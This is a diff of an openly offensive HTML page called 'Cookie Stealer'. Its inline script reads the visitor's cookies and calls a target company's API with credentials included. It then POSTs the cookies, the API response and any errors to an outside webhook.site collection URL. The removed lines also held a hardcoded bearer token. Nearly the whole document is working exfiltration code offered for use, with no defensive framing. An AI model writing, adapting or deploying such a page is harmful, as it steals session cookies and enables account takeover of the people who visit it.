@@ -3,12 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Cookie & Credential Stealer</title>
+    <title>Cookie Stealer</title>
     <script>
-        // Define the authentication token (replace with a valid token if available)
-        const authToken = "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"; // Replace with a valid token, if required.
-
-        // Function to send stolen data to an attacker's server
+        // Function to send data to an attacker's server
         function exfiltrateData(data) {
             fetch("https://webhook.site/c0e8e9d5-f4b5-4666-aba6-b4a814e8cf80", {
                 method: "POST",
@@ -17,15 +14,16 @@
             });
         }
 
-        // Collect cookies
+        // Capture cookies
         const cookies = document.cookie;
+        console.log("Cookies:", cookies); // Log cookies to the console for verification
 
-        // Fetch an API response using the auth token
+        // Optional: Send cookies and test API access
         fetch("https://api.company-target.com/api/v3/ip.json", {
             method: "GET",
             credentials: "include", // Include cookies with the request
             headers: {
-                "Authorization": `Bearer ${authToken}`, // Add the auth token if required
+                "Authorization": "Bearer YOUR_AUTH_TOKEN", // Include token if needed
                 "Content-Type": "application/json"
             }
         })
@@ -34,25 +32,27 @@
             // Exfiltrate cookies and API response
             exfiltrateData({
                 cookies: cookies,
-                credentials: apiResponse
+                apiResponse: apiResponse
             });
 
-            // Optionally display them on the page (for debugging/testing)
-            document.body.innerHTML += `<h2>Cookies:</h2><pre>${cookies}</pre>`;
-            document.body.innerHTML += `<h2>API Response:</h2><pre>${apiResponse}</pre>`;
+            // Display cookies and response on the page
+            document.body.innerHTML += `<h2>Cookies:</h2><pre>${cookies || "No cookies available"}</pre>`;
+            document.body.innerHTML += `<h2>API Response:</h2><pre>${apiResponse || "No response"}</pre>`;
         })
         .catch(err => {
-            // Handle errors and exfiltrate them
-            exfiltrateData({ error: err.toString() });
+            // Handle errors
+            console.error("Error:", err);
             document.body.innerHTML += `<h2>Error:</h2><pre>${err.toString()}</pre>`;
+            exfiltrateData({ error: err.toString() });
         });
     </script>
 </head>
 <body>
-    <h1>Enhanced Cookie & Credential Stealer</h1>
-    <p>If you're authenticated, this page will collect your cookies and credentials!</p>
+    <h1>Cookie Stealer</h1>
+    <p>This page will collect your cookies and attempt to fetch sensitive information!</p>
 </body>
 </html>
+
 
 <!-- <!DOCTYPE html>
 <html lang="en">
